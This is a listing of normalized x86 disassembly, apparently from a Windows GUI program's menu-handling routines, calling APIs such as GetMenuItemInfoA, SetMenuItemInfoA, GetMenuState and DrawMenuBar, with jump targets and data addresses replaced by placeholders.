mov edx esi
mov eax ebx
call sub_467c38
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_46a788
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407ea0
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403fd0
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c830
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c830
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_467c38
push eax
mov edx esi
mov eax ebx
call sub_467c38
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_40449c
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407ea0
push ebp
mov eax [ ebp - 0x2c ]
call sub_4685d4
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_4685d4
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c830
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404014
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_467c38
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_467c38
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_46a6f4
mov edx [ ebp - 0x40 ]
pop eax
call sub_403fd0
mov edx esi
mov eax ebx
call sub_467c38
push eax
mov edx esi
mov eax ebx
call sub_467c38
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40423c
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_40449c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_468688
mov eax [ ebp - 0x18 ]
call sub_40423c
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4044dc
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404524
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_468688
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_468ce4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_467c28
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_467c28
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_468e68
test al al
je r-xdata
mov eax esi
call sub_467c28
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_467c38
call sub_468cc0
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_467c38
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_467c38
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_467c38
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_467c38
call sub_468cc0
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_467c38
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_467c38
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_467c38
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_467c38
call sub_468cc0
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_468e3c
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_468e3c
and eax 0x7f
mov al [ eax + rw-data ]
sub_468e68
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_468e68
and eax 0x7f
mov al [ eax + rw-data ]
sub_468e94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465b7c
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_4212ec
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_469bc0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_468f30
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4031ec
mov eax [ esi + 0x44 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421338
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_468fa4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_468fa4
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4656e8
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_46802c
mov eax ebx
pop esi
pop ebx
retn
sub_468fe4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_467c28
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_467c38
call sub_468fe4
pop ecx
test al al
je r-xdata
sub_46907c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_468fe4
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4656e8
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4690ac
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_46907c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_46a478
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_46911c
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_46907c
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_469138
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_46907c
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_4687e8
mov ebx eax
xor edx edx
mov eax edi
call sub_468ce4
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_468150
mov eax [ esi + 0x34 ]
call sub_468150
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_46608c
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_45c380
push eax
call DrawMenuBar
sub_469224
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_469224
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_469349
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_46907c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_468150
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_469214
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_469378
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42c464
xor eax eax
push ebp
push sub_469476
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42c464
xor eax eax
push ebp
push sub_46944b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_469224
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42c45c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46947d
mov eax [ rw-data ]
call sub_42c45c
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_46907c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_46949c
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_469820
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_469820
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_469558
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_469af4
mov eax ebx
call sub_408980
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_4695f8
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_469558
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4041ec
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_40443c
lea edx [ ebp - 0x200 ]
call sub_408a70
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46968c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_4696fc
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_469b9c
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_469b9c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_469b9c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_469708
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_4695f8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_46968c
mov eax ebx
call sub_469bc0
jmp r-xdata
sub_469770
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4697b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_4639e8
mov eax ebx
call sub_468fcc
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_463a2c
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_4213bc
sub_4697f4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421608
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_4697b8
sub_469838
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_46907c
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_46907c
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_46cbe8
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_469894
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_469969
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_46907c
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_46907c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_467c28
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_467c38
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404164
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404164
mov eax [ ebp - 0xc ]
pop edx
call sub_40804c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_46a788
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469970
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fa0
retn
sub_46997c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_469838
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_469894
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_469af4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_469200
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_46907c
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_46907c
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
